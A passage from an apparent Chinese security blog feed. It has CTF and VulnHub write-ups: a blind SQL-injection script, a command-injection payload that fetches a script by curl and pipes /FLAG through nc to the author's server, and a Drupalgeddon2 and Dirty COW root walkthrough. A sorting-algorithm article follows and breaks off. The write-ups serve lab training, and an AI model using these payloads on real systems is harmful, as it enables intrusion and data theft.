note.fl4g),0x7e),1)--+&amp;pass=xxxx</code></pre><p>得：n1book{login_sqli_is_nice}</p><h4 id="基于时间："><a href="#基于时间：" class="headerlink" title="基于时间："></a>基于时间：</h4><p>大体骨架：</p><pre><code>name=1&#39;+or+if(substr(database(),1,1)=&#39;n&#39;,sleep(1),1)#&amp;pass=xxx</code></pre><p>脚本：</p><pre><code>import requestsimport timel = &#39;qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890{}&#39;url = &#39;http://challenge-92892f03ae72aafc.sandbox.ctfhub.com:10080/login.php&#39;# sql = &quot;1&#39; or if(substr(database(),%d,1)=&#39;%s&#39;,sleep(2),1)#&quot;# sql = &quot;1&#39; or if(substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=&#39;%s&#39;,sleep(2),1)#&quot;# sql = &quot;1&#39; or if(substr((seLEct group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;),%d,1)=&#39;%s&#39;,sleep(2),1)#&quot;sql = &quot;1&#39; or if(substr((seLEct flag from fl4g),%d,1)=&#39;%s&#39;,sleep(2),1)#&quot;flag = &#39;&#39;length=4for num in range(1,length+1):    for i in l:        data = {            &#39;name&#39; : sql %(num,i),            &#39;pass&#39; : &#39;asdasd&#39;        }        # print(data)        t = int(time.time())        r = requests.post(url = url , data=data)        if int(time.time()) - t &gt; 2 :            flag += i            print(&quot;flag:&quot; , flag)            breakprint(flag)</code></pre><h2 id="死亡ping命令"><a href="#死亡ping命令" class="headerlink" title="死亡ping命令"></a>死亡ping命令</h2><h3 id="考点：-7"><a href="#考点：-7" class="headerlink" title="考点："></a>考点：</h3><p><a href="https://zhuanlan.zhihu.com/p/138393396" target="_blank" rel="noopener">反弹shell原理与实现</a></p><p><a href="https://blog.csdn.net/xysoul/article/details/52270149" target="_blank" rel="noopener">nc工具的使用</a></p><h3 id="思路：-5"><a href="#思路：-5" class="headerlink" title="思路："></a>思路：</h3><p>利用curl命令来写入木马</p><p>利用已有的服务器，先编写脚本，然后再客户端将木马导入，再用该服务器对响应的端口进行监听，来获取返回值</p><h3 id="解题：-7"><a href="#解题：-7" class="headerlink" title="解题："></a>解题：</h3><p>在外部服务器编写脚本1.sh：</p><pre><code>ls / | nc [服务器ip地址] 8089cat /FLAG | nc [服务器ip地址] 8089</code></pre><p>payload：</p><pre><code>127.0.0.1%0acurl [服务器ip地址]/1.sh &gt; /tmp/1.sh127.0.0.1%0achmod 777 -R /tmp/1.sh</code></pre><p>然后在服务器端执行：</p><pre><code>nc -lvp 8089</code></pre><p>客户端触发脚本：</p><pre><code>127.0.0.1%0ash /tmp/1.sh </code></pre><p>这时候就会反弹得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> ctfhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lampiao渗透测试初探</title>
      <link href="/2020/12/19/lampiao-shen-tou-chu-tan/"/>
      <url>/2020/12/19/lampiao-shen-tou-chu-tan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="lampiao靶机渗透测试笔记"><a href="#lampiao靶机渗透测试笔记" class="headerlink" title="lampiao靶机渗透测试笔记"></a>lampiao靶机渗透测试笔记</h1><h4 id="简单介绍："><a href="#简单介绍：" class="headerlink" title="简单介绍："></a>简单介绍：</h4><pre><code>Would you like to keep hacking in your own lab?Try this brand new vulnerable machine! &quot;Lampião 1&quot;.Get root!Level: Easy翻译：你想在自己的实验室里继续黑客攻击吗？试试这个全新的易受攻击的机器！”Lampião 1”。获得root权限级别：简单下载地址：https://www.vulnhub.com/entry/lampiao-1,249/</code></pre><h4 id="采坑："><a href="#采坑：" class="headerlink" title="采坑："></a>采坑：</h4><p>1.下载靶机后会发现ovf文件，用VMware打开</p><p>2.压缩包不要解压！</p><h2 id="OK了，开始测试："><a href="#OK了，开始测试：" class="headerlink" title="OK了，开始测试："></a>OK了，开始测试：</h2><h3 id="第一阶段：信息收集"><a href="#第一阶段：信息收集" class="headerlink" title="第一阶段：信息收集"></a>第一阶段：信息收集</h3><p>ifconfig查看自己的ip地址：192.168.204.xxx</p><h4 id="扫描自己的内网（发现阶段）"><a href="#扫描自己的内网（发现阶段）" class="headerlink" title="扫描自己的内网（发现阶段）"></a>扫描自己的内网（发现阶段）</h4><pre><code>nmap -sP 192.168.204.0/24</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//1.jpg" alt></p><p>这里是对-sP命令的介绍：</p><p>1.-Pn是默认目标主机是存活的，-sP是使用ICMP协议发送echo请求数据包，但是很容易被防火墙过滤掉。想尽可能发现所有存活主机的话，建议使用半开式扫描参数-sS或者ACK扫描参数-sA，还无法确定存活主机的话可以试试-sF -sX -sN等参数。</p><p>2.nmap 执行（至少）两步操作，一个是主机发现（Ping），另一个是主机扫描。默认两步是都做的，-P0/-Pn 关闭主机发现，-sP/-sn 关闭主机扫描。两个一起用就是啥也不干，比如 nmap 0.0.0.0 -P0 -sP 显示“host is up”。按照你的要求，不做主机扫描，应该是 -sP，Ping 协议/端口被挡，可以用 -P 的其它选项。比如用 TCP SYN -PS 应该是最快的，UDP -PU 也可以。</p><p>只是扫描整个网段里面的所有ip，如果有ping的通的，通过-sP命令会给你显示出来（存活的主机）。</p><p>这里发现扫描到的主机有好几台，但是我们的目标是获取lampiao的ip地址，so需要进一步判断：</p><p>1.在lampiao靶机的网络配置里面找到mac地址</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//2.png" alt></p><p>2.在存活的主机里面找到与之相对应的mac地址</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//3.png" alt></p><p>3.得到lampiao的IP地址:192.168.204.137</p><h4 id="开始对主机进行扫描："><a href="#开始对主机进行扫描：" class="headerlink" title="开始对主机进行扫描："></a>开始对主机进行扫描：</h4><p>使用如下命令：</p><pre><code>nmap -A -p- -T4 192.168.204.137</code></pre><pre><code>这里-p是指所有的端口nmap -p(port1,port2,port3,...) &lt;target ip&gt;  解释：指定几个端口进行扫描例子：nmap -p80,443,22,21,8080,25,53 192.168.2.107</code></pre><pre><code>-T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4</code></pre><pre><code>nmap -A &lt;target ip&gt; 解释：nmap 万能开关次选项设置包含了1-10000的端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测。例子：nmap -A 192.168.2.107</code></pre><p>经过扫描得到了3个端口：22、80、1898</p><pre><code>可以发现，目标主机开放了三个端口，分别是22,80和1898,22端口是ssh服务，80端口是http服务，但是信息不是很详细，1898端口开放的是http服务，并且使用了Drupal框架</code></pre><p>另一种扫描方法：</p><pre><code>nmap -sS -sV -Pn -n  -A 192.168.191.133-sS 使用SYN半开式扫描，这种扫描方式使得扫描结果更加正确(又称半开放,或隐身扫描)-sV 探测端口的服务类型/具体版本等信息-Pn 禁用主机检测,目标主机屏蔽了ping请求时可用-n表示不进行dns解析，-p表示要-A强力扫描，耗时长</code></pre><p>这种方法比上一种方法要快，且更为保险</p><p>Drupal框架显示在这里：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//4.png" alt></p><p>得到版本为7（忘记截屏了），还发现了一些目录和文件！！</p><p>例如：/robots.txt文件</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//5.png" alt>g)</p><p>然后打开浏览器访问192.168.204.137:80端口得到如下页面（啥也没有。。。）：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//6.png" alt></p><p>但是当我们访问1898端口的时候出现如下页面：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//7.png" alt></p><h3 id="第二阶段：漏洞利用"><a href="#第二阶段：漏洞利用" class="headerlink" title="第二阶段：漏洞利用"></a>第二阶段：漏洞利用</h3><pre><code>在扫描端口的时候可以发现目标使用了Drupal框架，并且是7的版本，7的版本存在一些漏洞，可以利用这些漏洞来获得shell在网站中查找信息，看能否找到Drupal的具体版本查看网站的robots.txt文件</code></pre><p>这里是因为通过扫描发现了robots.txt（属于敏感信息范畴）</p><p>访问：</p><p>192.168.204.137:1898/robots.txt</p><p>得到如下信息：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//8.png" alt></p><p>这里是在注释为文件一栏目中的文件：changelog.txt（这里为大写）意思为改变的日志（更新日志）</p><p>访问192.168.204.137:1898/CHANGELOG.txt得到如下信息：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//9.png" alt></p><p>得到drupal的版本信息：7.54</p><p>然后就可以去网上搜索一下关于该版本的漏洞，然后针对漏洞进行攻击！</p><pre><code>在网上可以查到Drupal7.54存在的漏洞：https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=drupal可以利用metasploit来针对此版本的Drupal进行攻击，获得shell（咋看出来的我也不知道）经过查阅发现msf可以搜索一个框架的漏洞</code></pre><p>建议搜狗访问（因为可以翻译，别的浏览器我找不到在哪里翻译-_-||）然后翻译后发现：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//10.png" alt></p><p>这个版本的漏洞简直数不胜数（但是现在的依然需要根据教程来操作-_-||）</p><h3 id="接下来就是针对msf的使用"><a href="#接下来就是针对msf的使用" class="headerlink" title="接下来就是针对msf的使用"></a>接下来就是针对msf的使用</h3><p>1.</p><pre><code>search drupal搜索其漏洞得到：</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//11.png" alt></p><p>2.使用Drupal Drupalgeddon 2 Forms API Property Injection（远程代码执行漏洞）</p><pre><code>use 4set rhost 192.168.204.137set rport 1898show targetsset target 0#查看以及设置目标操作系统类型run #上面两步推荐的方式，这里我们直接run，这步结束后会得到一个会话用来连接对面的shellshellpython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; #执行shell获取交互式命令，由于我们获取的shell并不是一个具有完整交互的shell，对于已经安装了python的系统，我们可以使用 python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如上</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//12.png" alt></p><p>此时获取了shell然后开始查看当下目录</p><p>在var/www/html/sites/default目录下找到配置文件settings.php，发现敏感信息，tiago以及密码，很有可能就是其系统用户tiago的密码，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//321.jpg" alt></p><p>打开192.168.204.137:1898端口，发现了一篇文章的提交者，说明什么！这个人就很有可能是这个网站的管理员，或者系统用户所以就试试呗，毕竟信息收集也就这么多了。。</p><p>然后利用ssh协议进行远程登录</p><pre><code>ssh tiago@192.168.204.137</code></pre><p>成功获取shell！</p><p>最重要一步↓</p><h3 id="脏牛提权！！"><a href="#脏牛提权！！" class="headerlink" title="脏牛提权！！"></a>脏牛提权！！</h3><pre><code>uname -a查看一下内核信息：2016年的这是searchsploit dirty直接脏牛的木马喽一眼//看网上说用这个脚本提权cp /usr/share/exploitdb/exploits/linux/local/40847.cpp ~注意这里的 ~,他前面的是这个脚本的文件目录，~可以改为/root或者/home反正就是搁主目录下，一个ls就能看见那种</code></pre><p>如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52134_1.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52137_2.png" alt></p><p>然后再回到msf页面ctrl+c返回控制台 </p><pre><code>meterpreter &gt; upload /root/40847.cpp /tmp/40847.cpp</code></pre><p>把我/root文件下的目录传到/tmp目录下</p><pre><code>shell//继续连接回去python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;//进入TTL终端</code></pre><p>然后回到/tmp目录下ls查看：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52227_4.png" alt></p><pre><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil进行编译这是关于参数1-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告2-pedantic 允许发出ANSI/ISO C标准所列出的所有警告3-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高4-std=c++11就是用按C++2011标准来编译的5-pthread 在Linux中要用到多线程时，需要链接pthread库6-o dcow gcc生成的目标文件,名字为dcow./dcow -s#执行该文件 ./dcow &gt; status.txt有同样的效果</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8825%E6%97%A52217_3.png" alt></p><p>然后会发现该漏洞利用成功，已将root密码修改！</p><pre><code>www-data@lampiao:/tmp$ ./dcow &gt; status.txt./dcow &gt; status.txtRunning ...Received su prompt (Password: )Root password is:   dirtyCowFunEnjoy! :-)www-data@lampiao:/tmp$ su rootsu rootPassword: dirtyCowFunroot@lampiao:/tmp# lsroot@lampiao:/# cd /rootcd /rootroot@lampiao:~# lslsflag.txtroot@lampiao:~# cat flag.txtcat flag.txt9740616875908d91ddcdaa8aea3af366</code></pre><p>能做到此步十分感谢，十分感谢网上各位大佬的wp</p><p>总结：</p><p>对各种工具的掌握十分fw</p><p>不会就百度</p><p>对脏牛提取有了大体的认识</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十大经典排序算法整理汇总（附代码）</title>
      <link href="/2020/02/16/sort-algorithms/"/>
      <url>/2020/02/16/sort-algorithms/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>每日算法干货马上就来！</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/02/16/sort-algorithms/../themes/matery/source/medias/contact.jpg" alt></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文整理并总结了十大经典的排序算法（冒泡排序、选择排序、插入排序、快速排序、归并排序、希尔排序、计数排序、基数排序、桶排序、堆排序）的时间复杂度、空间复杂度等性质。</p><p><strong>本文并不会详细讲解每种排序算法的原理</strong>，网上有很多很好的教程，大家可以自己去搜了看。</p><p>最后我还亲自手写了十种排序算法的 c++ 代码，大家可以用来通过 <a href="https://leetcode-cn.com/problems/sort-an-array/" title="LeetCode 912. 排序数组" target="_blank" rel="noopener">LeetCode 912. 排序数组</a> 这道题。</p><h2 id="性质汇总"><a href="#性质汇总" class="headerlink" title="性质汇总"></a>性质汇总</h2><blockquote><p>如果发现表中有错误，请留言告知。</p></blockquote><table><thead><tr><th>算法</th><th>最好</th><th>最坏</th><th>平均</th><th>空间</th><th align="center">稳定性</th><th align="center">是否基于比较</th></tr></thead><tbody><tr><td>冒泡排序</td><td>$O(n)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>选择排序</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>插入排序</td><td>$O(n)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>快速排序</td><td>$O(n\log n)$</td><td>$O(n^2)$</td><td>$O(n\log n)$</td><td>$O(\log n)$~$O(n)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>归并排序</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>希尔排序</td><td>$O(n^{1.3})$</td><td>$O(n^2)$</td><td>$O(n\log n)$~$O(n^2)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>计数排序</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>基数排序</td><td>$O(nk)$</td><td>$O(nk)$</td><td>$O(nk)$</td><td>$O(n+k)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>桶排序</td><td>$O(n)$</td><td>$O(n)$</td><td>$O(n)$</td><td>$O(n+m)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>堆排序</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr></tbody></table><blockquote><p>如果表格显示有问题的话，还可以直接看下面的汇总图：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/02/16/sort-algorithms/1.png" alt="十大经典排序算法性质汇总"></p><h3 id="维基百科"><a href="#维基百科" class="headerlink" title="维基百科"></a>维基百科</h3><p>我觉得还是英文维基百科讲的比较详细、严谨。如果大家看的比较累的话，可以自己百度搜索相应的教程。</p><p><strong>冒泡排序</strong><br><a href="https://en.wikipedia.org/wiki/Bubble_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Bubble_sort</a></p><p><strong>选择排序</strong><br><a href="https://en.wikipedia.org/wiki/Selection_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Selection_sort</a></p><p><strong>插入排序</strong><br><a href="https://en.wikipedia.org/wiki/Insertion_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Insertion_sort</a></p><p><strong>快速排序</strong><br><a href="https://en.wikipedia.org/wiki/Quicksort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Quicksort</a></p><p><strong>归并排序</strong><br><a href="https://en.wikipedia.org/wiki/Merge_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Merge_sort</a></p><p><strong>希尔排序</strong><br><a href="https://en.wikipedia.org/wiki/Shellsort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Shellsort</a></p><p><strong>计数排序</strong><br><a href="https://en.wikipedia.org/wiki/Counting_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Counting_sort</a></p><p><strong>基数排序</strong><br><a href="https://en.wikipedia.org/wiki/Radix_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Radix_sort</a></p><p><strong>桶排序</strong><br><a href="https://en.wikipedia.org/wiki/Bucket_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Bucket_sort</a></p><p><strong>堆排序</strong><br><a href="https://en.wikipedia.org/wiki/Heapsort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Heapsort</a></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>所有的排序算法接口都是相同的，也就是 <code>vector&lt;int&gt; xxxSort(vector&lt;int&gt;&amp; nums)</code> 。只需要你传入一个 <code>vector&lt;int&gt;</code> 类型的数组，就能返回排序后的结果。</p><p>运行下来可以发现，桶排序速度是比较快的。而冒泡排序、选择排序和插入排序因为时间复杂度太高无法通过本题，基数排序因为无法处理负数也不能通过本题。</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">sortArray</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 冒泡排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">bubbleSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> n<span class="token number">-2</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 选择排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">selectSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> idx <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    idx <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 插入排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">insertSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 快速排序（24 ms）</span>    <span class="token keyword">void</span> <span class="token function">qSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">>=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>m<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token 